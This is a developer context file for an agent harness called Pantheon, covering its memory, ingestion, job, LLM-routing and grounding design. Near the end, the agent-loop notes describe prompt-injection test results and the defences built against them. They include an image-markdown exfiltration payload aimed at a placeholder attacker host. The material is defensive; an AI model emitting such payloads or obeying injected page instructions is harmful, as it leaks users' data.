# CLAUDE.md — Pantheon agent harness

This file gives Claude Code the working context for the Pantheon codebase. Read it before making changes.

## What Pantheon is

A single-user agent harness with persistent multi-tier memory, a source-adapter ingestion pipeline, autonomous scheduled tasks, and a knowledge-graph substrate for research workflows. Originally a sister/predecessor of `tuatha` (multi-tenant), Pantheon stays single-user and easy-to-install.

The user (Brent) runs Pantheon locally at `~/pantheon` against a small set of MCP connectors (YouTube transcript MCP, GitHub MCP, etc.) and uses it for thematic / vendor research over time — schedule a daily ingest, let it accumulate, analyze the graph at end of week.

## Architecture in three layers

1. **Memory.** `MemoryManager` (`memory/manager.py`) fronts five tiers — episodic, semantic, graph, working, archival (see "Memory, recall and history"); agents call `mgr.recall(query, tiers=[...])`. SQLite stores live under `data/db/` (episodic.db, graph.db, file_index.db, artifacts.db, jobs.db, vault.db, …), ChromaDB for semantic memory at `data/chroma/` (or a server via `CHROMA_HOST`), project metadata in `data/db/projects.json`.

2. **Source adapters.** The ingestion pipeline that turns "a URL or video_id" into a typed-topics-frontmatter markdown artifact + graph nodes/edges. Adapters live in `backend/sources/adapters/` and self-register at import time: 29 adapters across 10 mechanisms (`youtube`, `blog`, `pdf`, `web`, `forum`, `podcast`, `github`, `cfr`, `malegis`, `sec`). See "Source adapters" below and `backend/sources/SOURCE_ADAPTERS.md`.

3. **Jobs.** Unified async job system in `backend/jobs/`. Job types: `autonomous_task`, `coding_task`, `image_extraction`, `iteration_loop`, `autoresearch` (clients may create the first, second and fourth via `POST /api/jobs`; `autoresearch` only comes from the web-chat `start_autoresearch` tool; memory extraction and file indexing run inline, not as jobs). APScheduler fires schedules → `tasks.scheduler._enqueue_autonomous_job` creates a job row → `JobWorker` (asyncio task in the FastAPI process) polls and dispatches to the registered handler. See "Jobs" below.

## Directory layout

Directories only — read the code for files. `docs/tools.md` lists every agent tool.

```
~/pantheon/
├── backend/
│   ├── main.py            FastAPI app; mounts 19 routers; version from frontend/package.json
│   ├── config.py          Settings (Pydantic); settings.db_dir is canonical
│   ├── db_utils.py        apply_sqlite_pragmas — every SQLite store uses it
│   ├── security_log.py    Security audit log
│   ├── agent/             AgentCore loop (core.py), built-in tools (tools/: registry + domain modules), system prompt
│   │                      (prompts.py), history budget, freshness/search guards, output filter, text tool-call
│   │                      recovery, browser tools
│   ├── api/               FastAPI routers (auth, chat, files, memory, personality, projects +
│   │                      export/import, settings, mcp, mcp_oauth, skills, tasks, personas, system,
│   │                      connections, artifacts, conversations, jobs, llm_endpoints, messaging)
│   ├── artifacts/         Artifact store (SQLite + blobs), previews, conversions, embedder
│   ├── data/              BUNDLED defaults (soul presets in personas/, personality, migrations). Tracked.
│   ├── integrations/      GitHub API client
│   ├── jobs/              JobStore, JobWorker, watchdog, recovery, handlers/ (one per job type)
│   ├── llm_config/        Endpoints, task-class routes, model profiles, probe, chat router, tuning, usage
│   ├── mcp_client/        MCP client (protocol, OAuth, budgets) + connection manager
│   ├── memory/            Episodic, semantic, graph, file index, archival — see memory/README.md
│   ├── messaging/         Gateway + Telegram/Slack/Discord/Matrix/Mattermost adapters
│   ├── models/            ModelProvider / RoutedProvider, model discovery
│   ├── sandbox/           code_execute sandbox (subprocess or Firecracker; PANTHEON_SANDBOX)
│   ├── secrets/           Encrypted vault (data/db/vault.db)
│   ├── skills/            Skill registry, resolver, editor, importer/exporter, scanner, publisher
│   ├── sources/           Source-adapter registry, extractors, similarity — SOURCE_ADAPTERS.md
│   ├── tasks/             APScheduler integration (scheduler.py)
│   ├── utils/             net (safe_http_get), http pool, paths, progress, background, chat_settings,
│   │                      runtime_settings, document_converter, self_doc…
│   └── tests/integration/ Pytest suite
├── frontend/              Vite + React. package.json "version" is THE app version.
│   └── src/               pages/, components/ (chat/, chat-tabs/, settings/), api/client.js, store/
├── data/                  RUNTIME data, untracked — except data/personality/*.md (tracked copies
│                          of the bundled defaults; user overrides live here)
├── docs/                  User/reference docs (USAGE, tools, jobs, skills, messaging, security);
│                          docs/archive/ holds old plans and specs
├── scripts/               rotate_vault_key.py, gen_tools_doc.py, one-off migrations
├── skills/                Bundled skills (skill.json + instructions.md)
├── start.sh / stop.sh     Lifecycle scripts
└── deploy.sh / update.sh  Install / pull + rebuild
```

## Deploy / build / test workflow

The user runs Pantheon locally on a Linux box at `~/pantheon`. The venv lives at `~/pantheon/.venv`. The user runs deploy commands themselves — do NOT ssh and run them yourself.

Standard rebuild after code changes:

```bash
cd ~/pantheon && git pull
~/pantheon/.venv/bin/pip install -r backend/requirements.txt   # if deps changed
cd frontend && npm ci && VITE_API_URL="" npm run build && cd ..  # if frontend changed
./stop.sh && pkill -f "uvicorn main:app" 2>/dev/null
find backend -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null
./start.sh && sleep 3 && curl -s http://localhost:8000/api/health
```

The curl at the end shows the version string — confirm it changed before declaring a deploy successful.

Use `npm ci` (not `npm install`) on the dev box: it installs exactly what `package-lock.json` pins and never rewrites it, so `git pull` doesn't conflict. `npm ci` fails if `package.json` and the lockfile disagree — whenever you change a dependency **or bump the version in package.json**, run `npm install --package-lock-only` (or `npm install <pkg>`) and commit the updated lockfile.

Run integration tests:

```bash
cd ~/pantheon/backend && ~/pantheon/.venv/bin/python -m pytest tests/integration/ -v
```

About 590 test functions (2026-10-02). `tests/integration/conftest.py` lowers the vault KDF iteration count for speed. `test_autonomous_skill_resolution.py` is the canary for the autonomous-task path — if it goes red after a refactor, that path probably regressed. Add tests when fixing regressions.

## Versioning convention

There's ONE source of truth: `frontend/package.json`'s `"version"` field. The backend reads it via `utils/version.app_version()` (/api/health, the FastAPI app and get_self_documentation - self-doc had its own copy that looked in the wrong place in Docker and reported "unknown"). Bump it on every push:

- Format: `YYYY.MM.DD.HXX` (e.g. `2026.05.04.H1`)
- Increment the H suffix on each ship within a day (history has used both H9→Ha…Hz and H9→H10; either is fine — keep it short and never reuse a string)

The version surfaces at `GET /api/health` and as the FastAPI app version. The user uses it to confirm the deploy actually picked up new code.

## Source adapters

Pattern: `<mechanism>/<genre>` (e.g. `youtube/keynote`, `pdf/datasheet`, `blog/announcement`). Each adapter (`sources/base.py::SourceAdapter`) declares:

- `source_type` — canonical id, must be unique
- `display_name` — for UI
- `bucket_aliases` — heuristic shortcuts (`youtube`, `pdf`, `blog`, `web`)
- `requires_mcp` — MCP tools needed; validated when scheduled tasks fire
- `artifact_path_template` — path template for the saved artifact
- `extractor_strategy` — which `TopicExtractor` to run by default (default `llm_default`)
- `auto_extract: bool` — whether to run extraction inline (default True)
- `auto_link_similarity: bool` — whether to run cross-artifact similarity post-save (default False)

`registry.ingest(IngestRequest)` runs the full pipeline: fetch → extract topics → save artifact → `index_artifact` (chunks + embeds the body and builds the typed-topics graph) → optional similarity pipeline. `batch_ingest(reqs)` runs many with per-item failure isolation.

Built-in extractors (in `backend/sources/extraction.py`):
- `llm_default` — generic prose
- `llm_announcement` — vendor / event announcements (who/what/when/dollars/partners)
- `llm_structured_specs` — datasheets / product pages (specs + pricing + features)
- `llm_research_paper` — academic papers (abstract + methodology + findings)
- `llm_changelog` — release notes
- `noop` — pass-through for sources with pre-baked topics

**Ingest dedup vs save_to_artifact.** `ingest_source` / `registry.ingest`: re-ingesting the same canonical path UPDATES the existing artifact (new version in `artifact_versions`) — so to re-ingest with new behaviour, just rerun it; pass `extras={"force_new": true}` for a separate artifact. `save_to_artifact` is different: an existing path gets a `-1`, `-2`… suffix. Use `update_artifact` to revise in place.

**Ingest embeds once.** `registry.ingest` relies on `index_artifact`; the generic embedder (`artifacts/embedder.schedule_embed`) is only the fallback when that fails.

**Topic-extraction failures are visible.** Every artifact saved through `registry.ingest()` gets an `extraction_status` block in its frontmatter showing `{strategy, ok, error?, raw_excerpt?, topic_count}`. If topics is empty, look there to see why.

**Date parsing.** YouTube's MCP returns relative strings like `"4 months ago"`. The YouTube adapter accepts either `extras["published"]` (relative) or `extras["published_at"]` (ISO; wins if both). When orchestrating an ingest after the YouTube MCP's `search_youtube`, ALWAYS forward each video's `published` string so paths get real dates instead of `unknown-date/`.

**HTML→markdown.** `trafilatura.extract(output_format="html")` for cleaned article HTML, then `markdownify` (`sources/util.py`) for HTML→markdown. trafilatura's own markdown converter flattens lists into inline prose; markdownify preserves them.

**PDF extraction.** Default is `pdfplumber` (handles tables / structured layouts). `pypdf` is the faster fallback for prose. Image-only / scanned PDFs need OCR which isn't built yet.

**Adapters calling MCP tools** use `mgr.call_tool_raw()` (raw `{text, structured, is_error}`), never `execute_tool()` (LLM-formatted prose). Find the tool with `MCPManager.find_tool` (see MCP).

## Skills vs scheduled tasks

These are different and the agent must not confuse them:

- **Skill** — a reusable callable definition (slug + instructions.md). Invoked with `/skill-name` in chat, or via `skill_name` on `create_task` for scheduled runs. Created via `create_skill` agent tool.
- **Scheduled task** — a one-shot or recurring autonomous run. Has a schedule (`now`, `delay:N`, `interval:N` — minutes — or a 5-field cron) and optionally a `skill_name` binding. Created via `create_task` agent tool.

The autonomous_task handler resolves `payload.skill_name` (with underscore↔hyphen tolerance: `/content_ingest_graph` and `/content-ingest-graph` both resolve to `content-ingest-graph`), validates `requires_mcp` against the live MCP manager (`missing_tools`), and passes the full skill_context + project_name + active_skill_name to AgentCore. If the skill's required MCP tools are offline, the handler fails fast with a clear error rather than running a doomed loop.

System prompt distinguishes these explicitly under the "Skills vs scheduled tasks" section in `agent/prompts.py`. Don't merge them.

## Jobs

**Timeouts.** Per-type defaults: autonomous_task and coding_task 1800 s, iteration_loop 7200 s, image_extraction 300 s. Pass `timeout_seconds` on `create_task` for batch ingests that need longer.

**Terminal states.** The worker runs each handler as a supervised task: user cancel, total timeout, or the watchdog stalling the row all cancel it. A handler returning `{"status": "failed"|"error"}` is recorded FAILED and `{"status": "cancelled"}` CANCELLED — don't return those and expect "completed". `store.complete/fail/mark_cancelled` only transition rows that are still `running`. On worker shutdown the row stays `running` so orphan recovery re-queues it.

**Stall detection needs progress signals.** The watchdog marks a running job stalled after 5 min without a heartbeat (`JOB_STALL_TIMEOUT_SECONDS`, 300) and the worker cancels it. Agent handlers (autonomous, coding, iteration) wrap their run in `pinger_for(ctx, 30, max_quiet=AGENT_MAX_QUIET_SECONDS)` (900 s); the pinger only heartbeats while something calls `utils.progress.report_progress()` (agent rounds/stream chunks/tool results, ingest items, MCP responses) or `ctx.heartbeat()` (autonomous_task does so on every tool call, with the current plan step) — a hung await goes quiet and gets stalled. Long-running new code paths under a job should call `report_progress()`.

**Jobs run concurrently.** `JOB_WORKER_CONCURRENCY` (default 2). `REPO_JOB_TYPES` (`coding_task`, `iteration_loop`) never run two at a time per project, via `claim_next(exclusive_types=…, busy_projects=…)`.

**parent_session_id.** When `create_task` is called from a chat session, that session_id is captured as `parent_session_id` and threaded through to the autonomous handler. On completion the handler posts the result (or an ABORTED notice when the loop died on a provider error) into that originating session so the user sees it where they asked.

**Retired `scheduled_job`.** The type, its output sinks and `schedule_scheduled_job` are gone; `tasks.scheduler._enqueue_scheduled_job` survives only as a logging no-op so an APScheduler job persisted by an older build still loads.

**Fire-and-forget tasks.** Use `utils.background.spawn(coro)`, not bare `asyncio.create_task`/`ensure_future` — the loop holds only weak refs.

## LLM endpoints + task-class routing

Pantheon's LLM configuration is **named endpoints + task-class routes + model profiles** (`llm_config/`, API `/api/llm/*`).

- **Saved endpoint** — `{name, base_url, api_type, api_key}` stored once. `api_type` is `openai` (covers OpenAI-compat), `anthropic`, `ollama`, or `custom`. The API key lives in the vault keyed by `llm_endpoint_key__<name>`.
- **Task class** — what KIND of work a call is (`llm_config.models.TASK_CLASSES`): `agent` (tool-calling loop: chat, jobs, bots), `code` (coding_task + code chat turns; inherits agent), `quick` / `long_context` (chat router only; empty = never routed), `extract` (JSON extraction: ingest topics, memory entities, skill scans; inherits summarize), `summarize` (consolidation, notes, reports; inherits agent), `vision`, `image_gen`, `embed` (exactly one model, no fallback), `rerank`.
- **Route** — each class maps to an ordered `[{endpoint, model}, …]` list in vault `llm_routes`: primary first, then fallbacks. `RoutedProvider` (models/provider.py) tries them in order on 404/408/409/425/429/5xx/network errors (streams only fail over before the first chunk) and logs every attempt to `data/db/llm_calls.db` (`llm_config/usage.py`, 30-day retention; `GET /api/llm/usage`).
- **Model profile** — capabilities per `endpoint/model` (tools, vision, image_gen, embedding, tier fast/standard/frontier, context window). Precedence: user edits (vault `llm_model_profiles`) → what the endpoint **advertises** (vault `llm_model_advertised`, recorded by `store.refresh_advertised()` at startup and by the Probe button; parsed by `probe.capabilities_from_entry` from OpenRouter-style `supported_parameters`/`architecture`/`context_length`, a `capabilities` list or dict, LiteLLM `supports_*`, vLLM `max_model_len`, LM Studio `type`/`max_context_length`, and Ollama `/api/show`) → regex guesses in `llm_config/known_models.py`. Used to warn when a route puts a model on a class it can't serve (e.g. a non-tool model on `agent`).

**Call sites ask by class:** `get_provider_for("extract")`, etc. The legacy getters remain as aliases: `get_provider()`→agent, `get_prefill_provider()`→summarize, `get_vision_provider()`→vision, `get_embedding_provider()`→embed, `get_reranker_provider()`→rerank. Pick the class that matches the work when adding a new LLM call. `reset_provider()` clears the per-class cache — every endpoint/route/profile mutation in the API router calls it.

**Adding a task class.** Add it to `TASK_CLASSES` + the `TaskClass` literal in `llm_config/models.py`, handle it in `get_provider_for` if it has special semantics, and use `get_provider_for("<class>")` at the call site. The UI renders classes from `/api/llm/task-classes` automatically.

**Migration and legacy keys.** Legacy flat keys → endpoints + 5-role mapping (`llm_config_migrated_v1`), then role mapping → routes once (`llm_routes_migrated_v1`): chat→agent **and** extract (ingest kept on the chat model), prefill→summarize, vision/embed/rerank carried over. The legacy `/api/llm/roles` endpoints still work and write the primary of the mapped class. Legacy vault keys (`llm_*`, `embedding_*`, `prefill_*`, …) are read only by the one-shot migration in `llm_config/migration.py`; `/api/settings` no longer accepts or returns them.

**Image generation.** `generate_image` agent tool → `image_gen` class → `ModelProvider.generate_image`, which supports both API styles: OpenAI `POST /images/generations` (`b64_json`/`url`) and chat-completions image mode (`modalities: ["image","text"]` + `image_config`, images in `choices[0].message.images[].image_url.url` — Abacus RouteLLM, OpenRouter, Gemini-style). It tries `/images/generations` first, falls back to chat mode on 400/404/405/422, and remembers the working style per base_url+model. Sizes: the tool accepts WxH, `W:H` or a named preset (`square_hd`, `landscape_16_9`, …); `/images/generations` gets WxH, chat mode gets `aspect_ratio` W:H, and if the backend rejects that with a 400/422 naming presets it retries once with the nearest preset (in `image_size` or `aspect_ratio`, whichever the error names) and remembers it per model (`_IMAGE_WANTS_PRESET`). URLs are fetched via `safe_http_get`. Images are saved as binary artifacts under `<project>/images/generated/<date>/` and the tool result carries `[DISPLAY:artifact://<id>]`, which `components/chat/ToolCallBlock.jsx` renders inline.

**Image editing.** `generate_image(source_image=<artifact id|path>)` sends the stored image with the prompt: chat mode adds it as an `image_url` content part (edit models like qwen-image-edit), images mode uses `POST /images/edits` (multipart). The result records `edited_from`. The tool description teaches subject-first prompts that name each object once (and never mention what shouldn't appear).

**Chat router (per-turn).** `llm_config/router.py` picks the class for each interactive chat turn (`api/chat.py::_stream_turn` → `_route_turn` → `router.decide`), before the agent loop — the model never changes inside a tool loop. Rules, in order: session pin (`/model <class|auto>` or the chat input's picker, sent as `model_class`) → image the agent model can't see → history+message over 75% of the agent window (`long_context`) → skill `pantheon.model_class` → code fence/traceback/diff (`code`, sticky for `sticky_turns`, default 3) → short message with no tool-intent words and nothing time-sensitive, action-like or multi-step, and not a push-back (`quick`; `_TOOL_INTENT_RE` + `_NEEDS_AGENT_RE`) → optional LLM classifier on the `extract` class (off by default, 3 s cap) → `agent`. A rule only fires when the target class has its **own** route (inherited doesn't count) whose primary is tool-capable, so with nothing extra configured every turn stays on agent. Chat classes: `agent`, `quick`, `code`, `long_context`, `vision`. Pins live in process memory (single-user; reset on restart). Each turn emits a `model_route` WS event; `done` carries `route` incl. `served_model` (via the `models.provider.served_models` ContextVar, so fallbacks show); the route is stored in the assistant message's episodic metadata and logged to `route_decisions` in `llm_calls.db` (`GET /api/llm/router/decisions`). Config: vault `llm_router`, `GET/PUT /api/llm/router`. Background jobs never go through the router.

**What `quick` is for (measured, not assumed).** A live A/B on homely's 9B (quick = thinking off, agent = thinking on): arithmetic 24/27 on quick vs 22/27 on agent (and faster), memory questions 15/15 on quick (recall supplies the facts), but time-sensitive questions made quick answer "I don't have access to real-time information" instead of searching 2 times in 18 (agent 18/18). So `_NEEDS_AGENT_RE` sends time-sensitive wording, actions and multi-step requests (plan/compare/debug) to the agent and deliberately lets personal-memory and arithmetic questions stay quick. Watch the noun/verb traps: "book a table" vs "that book", "remind me to …" vs "remind me what we decided".

**Routing tuning.** Every routed chat turn records its outcome on its `route_decisions` row (`decision_id`, `latency_ms`, `iterations`, `tool_calls`, `tool_errors` — the `is_error` flag AgentCore puts on each `tool_result` event (`agent/tool_results.is_error`), `truncated`, `stream_error`) plus two user signals: `corrected` (the next message pushes back — `router.looks_like_correction` — or the user re-pins away from the routed class) and `rating` (👍/👎 on the reply badge → `POST /api/llm/router/feedback`). `llm_config/tuning.py`: `stats()` (problem rate = errored/truncated/corrected/👎, tool use, tool errors, latency, fallbacks per class and rule), `recommendations()` (quick misfire/quality/expand, code quality, sticky length, classifier, primary-vs-fallback reliability from `llm_calls`; need `MIN_TURNS` (15) / `MIN_CALLS` (20) samples; each may carry an `action`), `apply_recommendation(id)` (re-derives server-side; never automatic) and `simulate(patch)` (what-if: replays recent interactive chat user messages from episodic — job sessions and `/model` skipped — through `decide()` with private state, no LLM calls). API: `GET /api/llm/router/tuning`, `POST /api/llm/router/{simulate,apply,feedback}`. Warn/info suggestions also appear in self-doc.

**Agent self-knowledge.** `get_self_documentation` (utils/self_doc.py) renders the live routing table, routing warnings, the last 24h of LLM errors, the chat-router config and tuning suggestions — keep it in sync when routing changes, or the agent will describe stale config.

**Frontend.** Settings → **LLMs** (`components/settings/LlmSettings.jsx`) stacks Endpoints (`EndpointList`), Model routing (`ModelRouting.jsx` — per-class ordered models, capability badges, inline profile editor, warnings), Chat router (`ChatRouter.jsx`), Model usage (`RoutingUsage.jsx`) and Routing tuning (`RouterTuning.jsx`). API client: `llmApi.*`.

## Agent loop: tools, thinking and grounding

**Tool dispatch is a registry.** `agent/tools/__init__.py::execute_tool` applies the host-exec gate, routes `mcp_*` to the MCP manager, then calls `registry.resolve(name)` (exact names first, then the `browser_`/`github_`/`git_` prefixes) with a `ToolContext`. An unknown name returns `Unknown tool: …`, and any exception returns `Error executing …`. Workspace and git helpers live in `agent/tools/workspace.py`, and handlers call them as `_ws.<name>`, so tests patch `agent.tools.workspace.<name>` (not `agent.tools.<name>`). A test asserts every schema has a handler and vice versa.

**Consolidated tools; old names are hidden aliases.** The model sees 46 built-in tools (`_ORDER`), plus browser tools when enabled and MCP tools. These replace old ones:
- `github(action=…)` replaces the ten `github_*` tools.
- `merge_topics(action=list|approve|reject|force)` replaces the four merge tools.
- `index(target=artifact|workspace)` replaces `index_artifact` and `index_workspace`.
- `create_task(job_type="coding_task")` replaces `start_coding_task`.
- `batch_convert_documents` replaces `convert_document`, and `ingest_source` replaces `save_transcript_artifact`.

Each retired name is in `agent.tools.LEGACY_TOOLS`. Its handler is still registered, so user skills, task plans and the coding/iteration job prompts that name it keep working, but its schema isn't sent to the model. The new tools delegate to the old handlers. A test keeps retired names out of the prompt, and `docs/tools.md` lists them under "Retired names".

**Host-exec tools are gated per context.** `run_command`, `code_execute` and `git_*` (`agent.tools.HOST_EXEC_TOOLS`) are hidden unless `AgentCore(host_exec=True)`, and `execute_tool(..., host_exec=False)` refuses them too (AgentCore passes its own; tests that call git/run_command directly pass `host_exec=True`). Chat (`api/chat.py`) and `coding_task` pass `host_exec_allowed("interactive")`; autonomous/iteration jobs and messaging bots pass `host_exec_allowed("background")`. `AGENT_HOST_EXEC=interactive|always|never` (default interactive) controls it. New `AgentCore` call sites default to no host exec. `build_system_prompt(host_exec=…)` likewise shows the local git/run_command protocol only where those tools exist; background contexts get a short note pointing at the `github` tool / `create_task(job_type="coding_task")`.

**Tool calls with bad arguments aren't run.** `models.provider.parse_tool_args` marks non-JSON or non-object arguments with `args_error`. AgentCore then returns an error result to the model instead of calling the tool with `{}`.

**Textual tool calls are recovered.** `agent/text_tool_calls.py`: when a model (typically local, or a server without a tool-call parser) writes the call as text — ReAct `action`/`action_input` (even with an unescaped string input), `name`/`arguments`, `<tool_call>` tags, JSON in a fence, Gemma `tool_code` — and the WHOLE reply is calls to known tools, AgentCore runs them as real tool calls. Streamed replies starting with `{`, `[`, ``` or `<tool_call` are held until the round ends so the raw call never reaches the chat.

**Tool results are capped for the model, not the UI.** `agent/tool_results.cap` trims what AgentCore appends to `messages` to `TOOL_RESULT_MAX_CHARS` (default 24000; head + tail + an omission note); the `tool_result` event keeps the full text. `tool_results.is_error` is the one tool-failure check — reuse it, don't add another regex.

**`web_fetch` reads a page without keeping it** (`safe_http_get` → trafilatura → markdown, `max_chars` default 20000, ≤ 60000); `ingest_source` is for sources worth keeping. The agent guide is `backend/data/personality/agent.md` (short; the detailed rules live in `agent/prompts.py`) — keep tool names in it real (a test checks).

**Agent thinking is opt-in (`AGENT_THINKING`, default off).** When set, AgentCore sends `chat_template_kwargs: {"enable_thinking": true}` on agent-class rounds only (`provider.task_class == "agent"`; code/quick routes are untouched), via the `extra_body` argument of `ModelProvider.chat` / `chat_complete` (may set request options such as `tool_choice`, never `model`/`messages`/`stream`/`tools`). Off by default because other OpenAI-compatible servers may reject the extra field; `extra_body` is only passed when set, so providers and test fakes without the parameter keep working. Providers return the model's `reasoning_content` as `reasoning` (streaming `done` event, `chat_complete` dict). If a round ends with no tool calls and no text but has reasoning — a thinking model that left its answer in the reasoning — `_finalize_from_reasoning` makes one more call, thinking off and `tool_choice: "none"`, with the reasoning handed back as working notes (streamed via `_finalize_stream` when the turn streams). It resends the round's tools rather than dropping them: chat templates render tools at the top of the prompt, so a tool-less call can't reuse the round's KV cache (measured 3.3 s uncached vs ~1 s). Thinking stops once the turn has tool results (`AGENT_THINKING_AFTER_TOOLS`, default off) — except round 1 after a pre-search, which reasons over the results. Latency harness: the after-tools round was where answers most often got stuck in the reasoning (an extra, non-streamed finalize call: first visible text = total time) and most of the generated tokens.

**Time-sensitive questions must be looked up (`agent/freshness.py`, `AGENT_FORCE_SEARCH`, default on).** When `needs_fresh_facts(message)` matches (recency words, moving values like prices/rates/results, "who is the <office>"), AgentCore holds round 1's text back; if that round made no `web_search`/`web_fetch` call (none at all, or only `recall` — it once recalled "Joe Biden president 2026"), the text is dropped and a `web_search` for the USER'S words is added to the round (`_auto_search_call`), so round 2 answers from results. The same guard covers names the model may not know (`unknown_entities`: "What is X?", "tell me about X", "use / set up / switch to / buy X" where X is a capitalised or camel-case name that isn't one of Pantheon's own tools or skills) — then the added search is "What is X?". With `AGENT_PRE_SEARCH` (default on) that search runs BEFORE round 1 instead, so round 1 is the answer round and streams — saves the "decide to search" round (~1.5 s with thinking); URLs in the user's message (`_user_urls`, outside code fences, up to 3) are fetched BEFORE round 1 (`AGENT_PREFETCH_URLS`) and such turns skip the web pre-search — asked "<url> — what's this about?" the agent searched memory/artifacts instead (0/3); time-sensitive (non-version, non-entity) pre-search queries get the current month and year appended, because with the bare words engines ranked old pages first. Questions about Pantheon itself or the user's own things (`about_self`: "your configuration/tools/…", "this agent/harness/project", "Pantheon", "my project/notes/…") are never forced to the web, and bare "current"/"results"/"rate" don't count — "describe the current configuration of this agent harness" was answered from Windows and Microsoft Agent Framework pages (2026-10-02). Self-description questions (`wants_self_description`) call `get_self_documentation` BEFORE round 1 — with only the web search suppressed, the model reused its own earlier wrong answer from recalled memory. Measurements: on politics/current events the agent was right 54/60 times when it searched and 8/15 when it answered from training data ("As of October 2026, the President is Joe Biden", "the current Pope is Pope Francis"); asked about Jev (TypeSafe AI's decision model, Sept 2026) it searched 1 time in 5 and otherwise invented a meaning from nearby context ("Jevons paradox", "the user's Proton Mail project"). Don't use `tool_choice: "required"` for this: llama.cpp doesn't enforce it with Qwen templates (the model wrote prose until max_tokens; a named function choice was ignored too).

**Follow-ups inherit the lookup; chat turns have a lookup budget (`agent/freshness.followup_needs_fresh`, `AGENT_WEB_BUDGET`).** 2026-10-02: after two searched Senate-race questions, "can you do a similar breakdown for the house?" had no time words, went to the quick route unsearched, filled a House table from memory until max_tokens (4096) and repeated "Greg Landsman" across nine Ohio districts; the user's corrections went the same way. A short follow-up (<= 300 chars; not an acknowledgement, a reshape like "summarize that", or a question about Pantheon) counts as time-sensitive when one of the last 3 user messages was, or when the answer to it ended with a Sources list (`looked_up`). The router sends such turns (and every `needs_fresh_facts` turn) to the agent class (rule `fresh`), and AgentCore pre-searches a standalone query the model writes from the last 4 messages (`_standalone_query`; fallback "previous question - follow-up"), dated unless it is a version query or already has a year. Plural offices count ("current governors", "current senators"). In interactive chats, after `AGENT_WEB_BUDGET` (12) web_search/web_fetch calls in one turn the agent gets a notice and a `tool_choice: "none"` round, and further calls are dropped: asked for every Ohio district with both candidates it once made 48 lookups with guessed names (Katie Porter "in Ohio"). A final reply that stopped on `finish_reason: "length"` ends with `CUT_OFF_NOTE`. `web_fetch` drops footnotes, anchors and same-site link URLs from pages over the limit (`compact_links`): the Wikipedia governors list was 43.7k chars of mostly link URLs and the table started after the 20k cut. Guide rules: answers from search results contain only what the results say (padding - an invented poll table, last year's team - was the main grounding failure); long lists only from a page that lists them. `AGENT_PRESENCE_PENALTY` exists (default 0) but measured no gain once the turn was searched. Measured (same-day A/B vs main, judge = gemini-3.8-flash, K=3): follow-up conversations 9/27 -> 21/27 (held-out 11/30 -> 21/30; fresh follow-ups searched 5/21 -> 17/21 held-out), degenerate replies 3/27 -> 0/27; gates unchanged within noise (versions 37 -> 36/39, products 27/30 both, politics 44 -> 43/45, TTFT 1.59 -> 1.53 s, injection 0/54 both). Still weak: exhaustive lists (1/6) - the 9B model mis-copies 50-100-row tables even from the right page - and first questions like "Which Texas House seats are competitive in 2026?" that carry no time word, so their follow-ups aren't seen as current. Harness: `followup/` (test instance).

**Version questions get release tables, not just snippets (`agent/release_facts.py`).** Graded against ground truth fetched at run time, the agent searched every time but stated the exact current version about half the time: snippets and blogs are stale, and a single release-notes page (even a beta's — PostgreSQL 19 Beta 4 notes say "release date 2026-??-??") reads like a release. When a `web_search` query has version intent and names an endoflife.date product (slug words in order and not preceded by another name word — "Uptime Kuma" is not Kong's `kuma`, whose 2.14.5 the agent reported — plus aliases such as golang, node, postgres, k8s, kernel, docker), the tool prepends that product's table — newest release, newest LTS (only once the LTS date has passed: Node 26's `lts` is a future date until late October), other cycles with EOL status — above the results, which are labelled "snippets may be outdated". Cached (products 24 h, tables 1 h); any failure adds nothing. `SEARCH_RELEASE_FACTS=false` disables it (it sends the product name to endoflife.date). When no endoflife.date product matches, `github_release_facts` appends the project's newest **stable** release from its GitHub release list, naming newer pre-releases as NOT stable — without it the agent reported Ollama's `v0.35.1-rc0` as the latest stable. Candidate repos = GitHub repo-name search (≥500 stars) + `github.com/owner/repo` links in the results + (when an org is named after the product) that org's top repos; the MOST-STARRED wins — the first matching link was often a side repo (`home-assistant/operating-system` = HA OS 18.3, `tailscale/github-action`). GitHub API unauthenticated by default (60 req/h, 10 searches/min per IP; optional `GITHUB_TOKEN`), cached 1 h / 24 h. The agent guide's "check a listing, not a snippet" rule covers the rest.

**Answers built on web results end with sources that state their facts (`agent/sources.py`, `ANSWER_SOURCES`, default on).** AgentCore keeps url -> text for the turn's `web_search` result entries / release-data blocks and `web_fetch` pages; if the final answer cites no URL, it appends "Sources:" with up to 2 URLs whose text contains the answer's HEADLINE fact (its first version number or bolded value), ranked by the other key facts, release-data links first on ties — without the headline rule it picked pages about a predecessor the answer merely mentioned. Measured: 89/90 web-based answers, 10 cited anything; told to cite, the model often picked a plausible "official" page that doesn't state the fact (Blender 5.2 release notes for "5.2.2").

**Outside content is fenced data (`agent/tool_results.for_model`).** Results of web/browser/MCP tools (`UNTRUSTED_PREFIXES`) reach the model inside `<untrusted_content tool="…">…</untrusted_content>` with a note that it is data, not instructions; chat-template control tokens (`<|im_start|>`, `[INST]`, `<start_of_turn>` …) are defused first — llama.cpp can tokenise them inside tool output as REAL special tokens, i.e. a web page could open a system turn. Measured with fixture pages (injection harness): before this, a page's "store this permanently" made the agent call `remember` silently and a fake system block in a changelog got its malware link relayed as a "Security Notice".

**Remote images in replies are shown as text (`agent/output_filter.py`).** `AgentCore.chat` wraps `_chat_events` and filters every `text_delta` (streaming `ImageFilter`, holds from "![" until the image markdown closes) plus `full_response` and the working-memory copy: `![alt](http…)` becomes "*(image not shown: alt — external image from host)*" unless the user's own message contained that URL; relative/internal images stay. The UI renders markdown images, so an injected `![x](https://attacker/p.png?d=<notes>)` would make the browser send data with zero clicks — fenced content alone still let it through 2/3 times.

## MCP — protocol, OAuth, budgets

**Protocol version.** `backend/mcp_client/client.py` advertises `MCP_PROTOCOL_VERSION = "2025-11-25"` in the `initialize` handshake. Whatever version the server echoes back gets stored on `self.negotiated_protocol_version` and sent on every subsequent request as the `MCP-Protocol-Version` header (required by strict servers since spec 2025-06-18). If you bump the constant, also update the docstring at the top of the file. A 404 on a request with `Mcp-Session-Id` re-initializes the session and retries once.

**OAuth 2.1 (Protected Resource Metadata + DCR + PKCE + OIDC fallback).** Add a connection with `auth_type="oauth2"` (the Add form's **OAuth 2.1** radio, which hides the API-key field) and the manager persists a bare config; the form then calls `POST /api/mcp/connections/{name}/start-oauth` (also behind the **Authorize** button):

1. Unauth probe of the MCP URL — expects 401 with `WWW-Authenticate: Bearer resource_metadata="<url>"`
2. Fetch the PRM document (RFC 9728) for `authorization_servers` + `resource`
